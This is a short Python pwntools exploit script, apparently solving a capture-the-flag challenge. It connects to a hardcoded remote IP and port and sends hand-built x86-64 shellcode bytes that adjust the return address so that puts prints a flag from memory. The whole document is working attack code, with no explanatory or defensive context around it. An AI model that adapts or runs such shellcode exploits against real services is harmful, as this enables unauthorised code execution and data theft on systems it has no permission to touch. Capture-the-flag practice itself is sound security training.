from pwn import *

ret_offset = 0xAEC
flag_offset = 0x201080
puts_plt = 0x7f0

# p = process("./shellcode", raw=False)
p = remote("18.222.179.254", "10004")

payload = "\x5f\x48\x81\xef"
payload += p32(ret_offset - puts_plt)
payload += "\x57\x48\x81\xc7"
payload += p32(flag_offset - puts_plt)
payload += "\xC3"

print payload
print len(payload)

p.sendline(payload)

print p.recvall()